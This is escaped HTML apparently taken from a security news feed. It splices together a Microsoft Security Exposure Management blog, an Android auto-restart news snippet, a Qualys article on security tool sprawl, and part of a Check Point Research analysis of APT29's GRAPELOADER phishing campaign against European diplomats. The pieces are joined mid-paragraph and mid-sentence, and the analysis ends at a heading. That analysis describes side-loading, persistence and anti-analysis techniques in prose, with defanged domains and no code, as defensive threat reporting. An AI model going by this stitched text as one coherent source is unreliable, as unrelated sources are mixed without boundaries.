&lt;p&gt;Consequently, when security teams can&amp;#8217;t track and communicate risks or improvements effectively, critical projects stall, budgets tighten, and the divide between teams and leadership widens. &lt;a href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-security-exposure-management"&gt;Microsoft Security Exposure Management&lt;/a&gt; addresses these challenges by introducing security initiatives, which provide a simple yet powerful way to assess readiness for specific areas or workloads, helping teams view current risks and allocate resources effectively. &lt;/p&gt;



&lt;p&gt;Microsoft Security Exposure Management currently includes the following types of initiatives:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Workload initiatives&lt;/strong&gt;: Assess and manage risks associated with specific workload domains, such as endpoints, identity resources, and cloud assets.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Horizontal cyberthreat initiatives&lt;/strong&gt;: Focus on managing risks for specific cyberthreat areas, such as ransomware protection or business email compromise-financial fraud.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Cyberthreat analytics initiatives&lt;/strong&gt;: Based on up-to-date research from Microsoft threat analytics experts, these initiatives assess risks associated with threat actors and vectors as well as reports with actionable recommendations.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Zero trust initiative&lt;/strong&gt;: Evaluate risks related to zero trust compliance, aligning with guidance from the &lt;a href="https://learn.microsoft.com/security/zero-trust/adopt/zero-trust-adoption-overview" rel="noreferrer noopener" target="_blank"&gt;zero trust adoption framework&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;
  These initiatives help create a snapshot of an organization&amp;#8217;s security posture that both technical teams and business leaders can understand.&amp;nbsp;Helping teams’ scope, discover, prioritize, and validate security findings while ensuring effective communication with stakeholders. Let&amp;#8217;s examine some particularly valuable initiatives our customers have found helpful for communicating with leadership. 
&lt;/p&gt;

&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="key-security-initiatives-that-resonate-with-leadership"&gt;Key security initiatives that resonate with leadership &lt;/h2&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&amp;#8220;We spend a lot of time on ransomware protection, so something helpful about the ransomware initiative is that you&amp;#8217;re now able to start to appreciate the &amp;#8216;what&amp;#8217;, the &amp;#8216;why&amp;#8217;, and the &amp;#8216;how&amp;#8217; can I improve not only the score, but where&amp;#8217;s the low hanging fruit we can tackle?&amp;#8221; &lt;br /&gt; &lt;br /&gt; —Joe Lykowski, Cyber Defense Leader at Dow Inc.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h3 class="wp-block-heading" id="ransomware-protection"&gt;Ransomware protection&lt;/h3&gt;



&lt;p&gt;The&amp;nbsp;&lt;a href="https://learn.microsoft.com/security-exposure-management/ransomware" rel="noreferrer noopener" target="_blank"&gt;Ransomware protection initiative&lt;/a&gt;&amp;nbsp;provides metrics that instantly resonate with leadership, showing progress indicators from high exposure (0) to no exposure (100). This initiative helps ensure recommended controls are properly configured and utilized, reducing the risk of successful ransomware attacks. By presenting these concrete metrics, you can demonstrate how implementing Microsoft-recommended controls directly minimizes ransomware risks to the business.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="critical-asset-protection"&gt;Critical asset protection&lt;/h3&gt;



&lt;p&gt;The&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/security-exposure-management/critical-assets" rel="noreferrer noopener" target="_blank"&gt;critical asset protection initiative&lt;/a&gt;&amp;nbsp;helps security teams identify and prioritize the organization&amp;#8217;s most valuable assets, show targeted security measures protecting these assets, and demonstrate reduced exposure of mission-critical systems. Critical assets are based on default rules Microsoft Security Exposure Management determined as critical, but users can also create custom roles to tag additional critical assets. By implementing suggested recommendations to boost the Critical Asset Protection initiative score, the organization lowers the risk of cyberattackers being able to circumvent critical assets.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="identity-security-initiative"&gt;Identity security initiative&lt;/h3&gt;



&lt;p&gt;The&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/security-exposure-management/initiatives" rel="noreferrer noopener" target="_blank"&gt;Identity security initiative&lt;/a&gt;&amp;nbsp;protects digital identities against phishing, malware, and data breaches. With identity-based cyberattacks continuing to be the primary entry point for breaches, this initiative provides clear metrics on progress that can be easily communicated to leadership. When presenting to boards or fellow executives, security leaders can show concrete improvements in identity protection posture, helping executives understand how investment in this area directly reduces organizational risk. &lt;/p&gt;



&lt;p&gt;Beyond ransomware, critical assets, and identity, Microsoft Security Exposure Management continues to develop initiatives that address other vital areas of security. These include cyberattack surface reduction, which minimizes potential entry points for cyberthreats, and data security posture, which helps organizations understand and improve their ability to protect sensitive information. Please click here for &lt;a href="https://learn.microsoft.com/security-exposure-management/initiatives-list" rel="noreferrer noopener" target="_blank"&gt;our full list of security initiatives&lt;/a&gt;. &lt;/p&gt;



&lt;p&gt;Security initiatives enable prioritization based on business impact rather than technical severity. &lt;a href="https://learn.microsoft.com/security-exposure-management/security-metrics" rel="noreferrer noopener" target="_blank"&gt;Security metrics&lt;/a&gt; show current compliance versus target state, critical asset tags highlight high-business-impact systems, and recommendation scoring shows the relative impact of each change.&lt;/p&gt;



&lt;p&gt;This data-driven approach helps security leaders make the case for specific investments by showing how they impact the overall&amp;nbsp;&lt;a href="https://techcommunity.microsoft.com/blog/microsoftdefendercloudblog/exposure-management-the-evolution-of-vulnerability-management/4084587"&gt;security posture score&lt;/a&gt;&amp;nbsp;that matters to executives. When budget discussions arise, security leaders can point to specific initiatives and show exactly how investments will improve scores in the areas that matter most to the business.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="embracing-clarity-over-fragmentation-with-microsoft-security-exposure-management"&gt;Embracing clarity over fragmentation with Microsoft Security Exposure Management &lt;/h2&gt;



&lt;p&gt;
  Security initiatives solve the fragmentation problem by organizing security metrics around business objectives rather than technical controls. This shift in approach with help from Microsoft Security Exposure Management initiatives, helps security leaders refresh stale conversations with leadership and align security priorities with business objectives. In focusing on initiatives that matter most to your organization and utilizing their clear metrics, you can transform presentations from technical debates into strategic discussions about business risk.

The new feature implements auto-restart of a locked device, which will make your personal data harder to extract. It's coming as part of a Google Play Services update, though, so there's nothing you can do to speed along the process.&lt;/p&gt;
&lt;p&gt;Google is preparing to release a &lt;a href="https://support.google.com/product-documentation/answer/14343500"&gt;new update to Play Services&lt;/a&gt; (v25.14), which brings a raft of tweaks and improvements. First &lt;a href="https://9to5google.com/2025/04/14/android-auto-restart-security/"&gt;spotted&lt;/a&gt; by 9to5Google, the update was officially released on April 14, but as with all Play Services updates, it could take a week or more to reach all devices. When 25.14 arrives, Android devices will see a few minor improvements, including prettier settings screens, improved connection with cars and watches, and content previews when using Quick Share.&lt;/p&gt;
&lt;p&gt;Most importantly, Play Services 25.14 adds a feature that Google describes thusly: "With this feature, your device automatically restarts if locked for 3 consecutive days."&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2025/04/android-phones-will-soon-reboot-themselves-after-sitting-unused-for-3-days/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

However, the unchecked proliferation of security tools has led to inefficiencies, reduced visibility, and increasing total cost of ownership. A recent &lt;a href="https://siliconangle.com/2024/08/05/cybersecurity-tool-sprawl-control-going-get-worse/"&gt;&lt;em&gt;SiliconANGLE&lt;/em&gt;&lt;/a&gt; article examined cybersecurity tool sprawl, highlighting the reactive adoption of new tools to address emerging threats and compliance mandates, as well as vendor-driven expansion of unintegrated security stacks. These factors compound security complexity, hindering agencies in identifying and managing enterprise risk.&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="the-rising-cost-of-cybersecurity-complexity"&gt;&lt;strong&gt;The Rising Cost of Cybersecurity Complexity&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Research cited in the article shows that large enterprises now manage &lt;strong&gt;an average of 76 security tools, up from 64 in 2019&lt;/strong&gt;. While the study primarily focuses on commercial enterprises, federal agencies face similar challenges. Fragmented security environments create redundant processes, increase risk exposure, and increase costs—ultimately undermining cybersecurity efforts rather than strengthening them.&lt;/p&gt;



&lt;p&gt;To meet mandates such as FISMA, NIST 800-171, and Zero Trust directives, it is imperative agencies transform architectures to an integrated security stack that:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&amp;nbsp;Introduces automated security processes&lt;/li&gt;



&lt;li&gt;Provides enhanced risk visibility and quantification of enterprise risk&lt;/li&gt;



&lt;li&gt;Increases security operation productivity to reduce mean time to remediate&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;span id="more-37581"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="how-the-expanding-attack-surface-drives-tool-sprawl"&gt;&lt;strong&gt;How the Expanding Attack Surface Drives Tool Sprawl&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;As the attack surface has expanded, the cybersecurity industry has responded with specialized solutions to secure new technologies. However, these solutions often operate in isolation, leading to fragmented security architectures. The ease with which new security tools are introduced has made managing cybersecurity operations increasingly complex and inefficient.&lt;/p&gt;



&lt;p&gt;To illustrate this, let’s use the &lt;strong&gt;NIST Cybersecurity Framework&lt;/strong&gt; as a foundation and examine how security tooling has evolved across the &lt;strong&gt;Identify, Protect, and Detect&lt;/strong&gt; functions, focusing on traditional IT, cloud, DevSecOps, AI/LLM, IoT/OT, and web applications.&lt;/p&gt;



&lt;figure class="wp-block-table is-style-stripes q-block__table-720 q-table-min-1600"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;NSF Objective&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Traditional IT&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Cloud&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;DevSecOps&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;AI/LLM&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;IoT/OT&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Web Applications&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Identify&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Asset Discovery, CMDB, Network Mapping, Vulnerability Assessment, IAM Systems, Data Discovery&lt;/td&gt;&lt;td&gt;Cloud Asset Management, CSPM, Cloud IAM, Cloud Vulnerability Scanners&lt;/td&gt;&lt;td&gt;Asset Management, Vulnerability Scanners, Container Security&lt;/td&gt;&lt;td&gt;LLM Model Inventory, LLM Data Classification&lt;/td&gt;&lt;td&gt;OT Asset Management, OT Network Mapping, OT Vulnerability Management&lt;/td&gt;&lt;td&gt;Web App Scanners, Web App Inventory Tools&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Protect&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Firewalls, AV Software, Encryption, Access Control, Patch Management, MFA, Secure Email Gateways, WAF&lt;/td&gt;&lt;td&gt;Cloud Firewalls, Cloud Encryption, CASB, Cloud Patch Management, Cloud MFA&lt;/td&gt;&lt;td&gt;DevSecOps Security, DevSecOps Encryption, DevSecOps Access Control&lt;/td&gt;&lt;td&gt;LLM Model Security, LLM Data Encryption&lt;/td&gt;&lt;td&gt;OT Firewalls, OT Endpoint Protection, OT Encryption, OT Access Control&lt;/td&gt;&lt;td&gt;Web App Firewalls, Embedded Security&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Detect&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;IDS, SIEM, Network Traffic Analysis, EDR, UEBA, Threat Intel Platforms&lt;/td&gt;&lt;td&gt;Cloud Log Analysis, Cloud IDS/IPS, Cloud EDR, Cloud UEBA, Cloud Detection &amp;amp; Response&lt;/td&gt;&lt;td&gt;DevSecOps Monitoring&lt;/td&gt;&lt;td&gt;LLM Model Monitoring, LLM Anomaly Detection, LLM Threat Intelligence&lt;/td&gt;&lt;td&gt;OT IDS, OT Network Monitoring, OT Threat Intelligence&lt;/td&gt;&lt;td&gt;Web App Monitoring, Web App Security Testing&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="the-fragmentation-problem-siloed-consolidation"&gt;&lt;strong&gt;The Fragmentation Problem: Siloed Consolidation&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;While the cybersecurity industry has made efforts to consolidate security functions, most consolidation has occurred within specific attack surface areas rather than across them. A prime example is cloud security: initially, organizations deployed separate tools for cloud workload protection, cloud security posture management (CSPM), and runtime security. Over time, the market evolved to unify these capabilities under &lt;a href="https://www.qualys.com/faq-cloud-native-application-protection-platform/"&gt;Cloud-Native Application Protection Platforms (CNAPP)&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;However, while CNAPP helps reduce cloud-specific tool sprawl, it does not address broader security fragmentation across on-premises, DevSecOps, AI/LLM, IoT/OT, and web applications. As a result, agencies still face siloed security operations, increasing complexity, and limited visibility across the entire attack surface.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="integrated-security-operations-the-path-forward"&gt;&lt;strong&gt;Integrated Security Operations: The Path Forward&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;To overcome the inefficiencies caused by fragmented tool adoption, federal agencies must adopt integrated, platform-based cybersecurity strategies. An effective, modernized security approach should:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Consolidate security functions across multiple environments (traditional IT, cloud, DevSecOps, AI/LLM, IoT/OT, and web applications).&lt;/li&gt;



&lt;li&gt;Enhance automation, eliminating manual processes and reducing operational overhead.&lt;/li&gt;



&lt;li&gt;Provide unified visibility and risk management, streamlining compliance with FISMA, NIST 800-171, and Zero Trust mandates.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This shift to integrated, automated security operations will improve threat detection and response, reduce costs, and significantly enhance operational efficiency.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="key-challenges-facing-federal-agencies"&gt;&lt;strong&gt;Key Challenges Facing Federal Agencies&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;1. Operational Inefficiencies from Tool Sprawl&lt;/strong&gt; Multiple security tools lacking integration create overlaps, inflated costs, and reduced productivity. Teams spend excessive time managing siloed dashboards, manually correlating risks, and reconciling data discrepancies, hindering proactive cybersecurity efforts. A &lt;a href="https://www.gao.gov/assets/gao-24-106291.pdf"&gt;2024 Government Accountability Office (GAO) report&lt;/a&gt; highlights these challenges, noting fewer than half of federal agencies achieve effective cybersecurity ratings annually.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;2. High Costs Due to Complexity&lt;/strong&gt; Managing fragmented tools leads to extensive manual workflows and increased resource expenditures. Agencies face escalating licensing, training, and maintenance costs, exacerbated by the risk of oversight and inefficiencies. Because federal and state facilities are prime ransomware targets, reactive security measures strain resources further, underscoring the need for centralization and automation.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;3. Visibility Gaps and Delayed Incident Response&lt;/strong&gt; Expanding digital footprints across diverse environments (cloud, OT, APIs, remote workforces) result in fragmented security visibility. Agencies struggle to manage assets, detect threats, and respond effectively due to data silos. The GAO’s 2024 findings confirm most civilian agencies fail in achieving cybersecurity objectives, while the Department of Defense emphasizes integrated frameworks to overcome traditional perimeter defense limitations.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="strategic-investments-to-improve-efficiency"&gt;&lt;strong&gt;Strategic Investments to Improve Efficiency&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Agencies must integrate visibility, posture management, and automated remediation within unified platforms. Fragmentation slows detection and response times, leaving critical vulnerabilities exposed. &lt;a href="https://www.qualys.com/forms/tru-research-report/"&gt;According to Qualys research&lt;/a&gt;, the average patch application exceeds 30 days, whereas vulnerability exploitation windows have reduced significantly—from nearly 20 days in 2022 to only &lt;a href="https://www.scworld.com/news/threat-actors-exploit-zero-days-within-5-days-says-googles-mandiant"&gt;five days by 2023&lt;/a&gt;. An integrated platform addresses this urgency by:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Offering real-time visibility across hybrid environments.&lt;/li&gt;



&lt;li&gt;Proactively identifying misconfigurations and compliance gaps.&lt;/li&gt;



&lt;li&gt;Automating remediation workflows to accelerate vulnerability mitigation.&lt;/li&gt;
&lt;/ul&gt;

The Techniques, Tactics and Procedures (TTPs) observed in this campaign align with the WINELOADER campaigns, which were attributed to&amp;#160;APT29, a Russia&amp;#160;linked&amp;#160;threat group. APT29, also commonly referred to as Midnight Blizzard [&amp;#8230;]&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/apt29-phishing-campaign/"&gt;Renewed APT29 Phishing Campaign Against European Diplomats&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading" id="highlights"&gt;Highlights&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Check Point Research has been tracking an advanced phishing campaign conducted by APT29, a Russia&amp;nbsp;&lt;a href="https://cert.pl/en/posts/2023/12/apt29-teamcity/"&gt;linked&lt;/a&gt;&amp;nbsp;threat group, which is targeting diplomatic entities across Europe.&lt;/li&gt;



&lt;li&gt;The campaign, which appears to be a continuation of a previous one that utilized a backdoor known as&amp;nbsp;&lt;a href="https://www.zscaler.com/blogs/security-research/european-diplomats-targeted-apt29-cozy-bear-wineloader"&gt;WINELOADER&lt;/a&gt;, impersonates a major European foreign affairs ministry to distribute fake invitations to diplomatic events—most commonly, wine tasting events.&lt;/li&gt;



&lt;li&gt;This campaign employs a new loader, called GRAPELOADER, which is downloaded via a link in the phishing email. In addition, we discovered a new variant of WINELOADER which is likely used in later stages of the campaign.&lt;/li&gt;



&lt;li&gt;While the improved WINELOADER variant is still a modular backdoor used in later stages, GRAPELOADER is a newly observed initial-stage tool used for fingerprinting, persistence, and payload delivery. Despite differing roles, both share similarities in code structure, obfuscation, and string decryption. GRAPELOADER refines WINELOADER’s anti-analysis techniques while introducing more advanced stealth methods.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;Starting in January 2025, Check Point Research (CPR) has been tracking a wave of targeted phishing attacks aimed at European governments and diplomats. The Techniques, Tactics and Procedures (TTPs) observed in this campaign align with the WINELOADER campaigns, which were attributed to&amp;nbsp;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/apt29-wineloader-german-political-parties"&gt;APT29&lt;/a&gt;, a Russia&amp;nbsp;&lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-057a"&gt;linked&lt;/a&gt;&amp;nbsp;threat group.&lt;/p&gt;



&lt;p&gt;APT29, also commonly referred to as Midnight Blizzard or Cozy Bear, is known for targeting high-profile organizations, including government agencies and think tanks. Their operations vary from targeted phishing campaigns to high-profile supply chain attacks that utilize a large array of both custom and commercial malware. The threat group is also&amp;nbsp;&lt;a href="https://attack.mitre.org/campaigns/C0024/"&gt;associated&lt;/a&gt;&amp;nbsp;with the SolarWinds supply chain attack.&lt;/p&gt;



&lt;p&gt;In this current wave of attacks, the threat actors impersonate a major European Ministry of Foreign Affairs to send out invitations to wine tasting events, prompting targets to click a web link leading to the deployment of a new backdoor called GRAPELOADER. This campaign appears to be focused on targeting European diplomatic entities, including non-European countries’ embassies located in Europe.&lt;/p&gt;



&lt;p&gt;In addition to GRAPELOADER, we discovered a new variant of WINELOADER active in this campaign. The compilation timestamp, as well as the similarity to the newly discovered GRAPELOADER suggests it was likely used in a later phase of the attack.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="campaign-overview"&gt;Campaign Overview&lt;/h2&gt;



&lt;p&gt;Approximately one year after the last iteration of the WINELOADER campaign, APT29 launched a new wave of phishing emails impersonating a European Ministry of Foreign Affairs, sending emails on their behalf with an invitation to wine tasting events. The emails contained a malicious link that led, in some cases, to the download of an archive, eventually leading to the deployment of GRAPELOADER. In other cases, the link in the phishing emails redirects to the official website of the impersonated Ministry of Foreign Affairs.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31392" height="936" src="https://research.checkpoint.com/wp-content/uploads/2025/04/grapeloader_infection.png" width="2788" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 &amp;#8211; High-level overview of GRAPELOADER infections.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Throughout the campaign, the targets include multiple European countries with a specific focus on Ministries of Foreign Affairs, as well as other countries’ embassies in Europe. In addition to the emails we’ve identified, we found indications of limited targeting outside of Europe, including of diplomats based in the Middle East.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="phishing-emails"&gt;Phishing Emails&lt;/h3&gt;



&lt;p&gt;These identified emails were sent from at least two distinct domains, &lt;code&gt;bakenhof[.]com&lt;/code&gt; and &lt;code&gt;silry[.]com&lt;/code&gt;, with the sender’s address impersonating a specific person in the mimicked Ministry of Foreign Affairs. Each email contained a malicious link that, when clicked, initiated the download of&amp;nbsp;&lt;code&gt;wine.zip&lt;/code&gt;&amp;nbsp;for the next stage of the attack. The domain hosting the link was the same domain used for sending the email. In cases where the initial attempt was unsuccessful, additional waves of emails were sent to increase the likelihood of getting the victim to click the link and compromise his machine.&lt;/p&gt;



&lt;p&gt;We identified several emails sent as part of the campaign, almost all of them with the theme of wine-tasting events:&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Email subjects&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Wine Event&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Wine Testing Event&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Wine tasting event (update date)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;For Ambassador’s Calendar&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Diplomatic dinner&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;The server hosting the link is believed to be highly protected against scanning and automated analysis solutions, with the malicious download triggered only under certain conditions, such as specific times or geographic locations. When accessed directly, the link redirects to the official website of the impersonated Ministry of Foreign Affairs.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="grapeloader-infection"&gt;GRAPELOADER Infection&lt;/h3&gt;



&lt;p&gt;The&amp;nbsp;&lt;code&gt;wine.zip&lt;/code&gt;&amp;nbsp;archive contains three files :&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;A legitimate PowerPoint executable,&amp;nbsp;&lt;code&gt;wine.exe&lt;/code&gt;, which is exploited for DLL side-loading.&lt;/li&gt;



&lt;li&gt;A hidden DLL,&amp;nbsp;&lt;code&gt;AppvIsvSubsystems64.dll&lt;/code&gt;, which is bloated with junk code, serving only as a required dependency for the PowerPoint executable to run.&lt;/li&gt;



&lt;li&gt;Another hidden and heavily obfuscated DLL,&amp;nbsp;&lt;code&gt;ppcore.dll&lt;/code&gt;, that functions as a loader, called GRAPELOADER, as it is likely used to deliver WINELOADER in later phases of the attack.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Once&amp;nbsp;&lt;code&gt;wine.exe&lt;/code&gt;&amp;nbsp;is executed and the GRAPELOADER DLL is side-loaded, the malware copies the contents of the&amp;nbsp;&lt;code&gt;wine.zip&lt;/code&gt;&amp;nbsp;archive to a new location on the disk. It then gains persistence by modifying the Windows registry’s Run key, ensuring that&amp;nbsp;&lt;code&gt;wine.exe&lt;/code&gt;&amp;nbsp;is executed automatically every time the system reboots.&lt;/p&gt;



&lt;p&gt;Next, GRAPELOADER collects basic information about the infected host, such as the host name and username. This collected data is then sent to the Command and Control (C2) server, where it waits for the next-stage shellcode to be delivered.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="new-wineloader-variant"&gt;New WINELOADER Variant&lt;/h3&gt;



&lt;p&gt;In addition, in proximity to GRAPELOADER phishing emails, a new variant of the WINELOADER was submitted to VirusTotal. The newly discovered variant shares the same Rich-PE headers and a compilation timestamp closely matching that of&amp;nbsp;&lt;code&gt;AppvIsvSubsystems64.dll&lt;/code&gt;, suggesting they were likely part of the same attack flow. With this information, and the fact that GRAPELOADER replaced ROOTSAW, an HTA downloader used in past campaigns to deliver WINELOADER, we believe that GRAPELOADER ultimately leads to the deployment of WINELOADER.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="technical-analysis"&gt;&lt;strong&gt;Technical Analysis&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;WINELOADER&lt;/strong&gt;&amp;nbsp;is a&amp;nbsp;&lt;a href="https://www.zscaler.com/blogs/security-research/european-diplomats-targeted-apt29-cozy-bear-wineloader"&gt;well-known modular backdoor&lt;/a&gt;&amp;nbsp;that is part of the APT29 toolset, but&amp;nbsp;&lt;strong&gt;GRAPELOADER&lt;/strong&gt;&amp;nbsp;is a newly observed tool designed for the initial stage of an attack. It is primarily used for fingerprinting the infected environment, establishing persistence, and retrieving the next-stage payload. Despite their differences in purpose, a closer analysis reveals that the new WINELOADER variant and the GRAPELOADER share many similarities, particularly in code structure, obfuscation techniques, and string decryption processing.&lt;/p&gt;



&lt;p&gt;A comparison of older and newer WINELOADER versions suggests that this backdoor has continued to evolve, not only preserving its core capabilities but also refining techniques from its earlier iterations. GRAPELOADER not only incorporates and enhances some of these advanced techniques, such as DLL unhooking, API resolving, code obfuscation, and string obfuscation, but also introduces entirely new methods to further improve its stealth and effectiveness.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="grapeloader"&gt;GRAPELOADER&lt;/h3&gt;



&lt;p&gt;GRAPELOADER is delivered as a 64-bit DLL (&lt;code&gt;ppcore.dll&lt;/code&gt;) with two exported functions:&amp;nbsp;&lt;code&gt;PPMain&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;DllGetLCID&lt;/code&gt;. While&amp;nbsp;&lt;code&gt;DllGetLCID&lt;/code&gt;&amp;nbsp;contains only mutated junk code(valid instructions that result in time-consuming mathematical operations within large loops), its primary purpose appears to be code bloating. A similar technique is used in&amp;nbsp;&lt;code&gt;AppvIsvSubsystems64.dll&lt;/code&gt;, which serves solely as a required dependency for the PowerPoint executable (&lt;code&gt;wine.exe&lt;/code&gt;) to run. The&amp;nbsp;&lt;code&gt;PPMain&lt;/code&gt;&amp;nbsp;function actually triggers the malicious execution.&lt;/p&gt;



&lt;p&gt;This DLL is executed via&amp;nbsp;&lt;strong&gt;DLL side-loading&lt;/strong&gt;&amp;nbsp;through&amp;nbsp;&lt;strong&gt;Delayed Imports&lt;/strong&gt;&amp;nbsp;of&amp;nbsp;&lt;code&gt;wine.exe&lt;/code&gt;, functioning as an initial-stage downloader. As execution occurs through the exported&amp;nbsp;&lt;code&gt;PPMain&lt;/code&gt;&amp;nbsp;function rather than&amp;nbsp;&lt;code&gt;DllEntryPoint&lt;/code&gt;, it does not operate under the loader lock.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Anti-Analysis Techniques&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Throughout its code, GRAPELOADER employs several anti-analysis techniques, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;String obfuscation&lt;/strong&gt;&amp;nbsp;– Each string is processed using three unique functions, tailored to work on a specific string. The first retrieves the encrypted byte blob, the second decrypts the blob using a custom algorithm, and the third immediately zeroes out the decrypted memory blob after use. This approach successfully defeats common automatic string extraction and deobfuscation tools like&amp;nbsp;&lt;a href="https://github.com/mandiant/flare-floss"&gt;FLOSS&lt;/a&gt;&amp;nbsp;by ensuring that decrypted strings never persist in memory long enough for automated analysis. In addition, as each string has unique processing methods, pattern-based heuristics struggle to reliably detect and extract them.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Runtime API resolving and DLL unhooking&lt;/strong&gt;&amp;nbsp;– Before calling any&amp;nbsp;&lt;strong&gt;WIN API&lt;/strong&gt;&amp;nbsp;or&amp;nbsp;&lt;strong&gt;NT API&lt;/strong&gt;&amp;nbsp;function, it first&amp;nbsp;&lt;strong&gt;unhooks&lt;/strong&gt;&amp;nbsp;the corresponding DLL and then resolves the API dynamically via in-memory&amp;nbsp;&lt;strong&gt;PE parsing&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 2 - GRAPELOADER - API resolving &amp;amp; DLL unhooking.&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;Persistence Mechanism&amp;lt;/strong&amp;gt;" src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image2.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; GRAPELOADER &amp;#8211; API resolving &amp;amp; DLL unhooking.&lt;br /&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Persistence Mechanism&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;



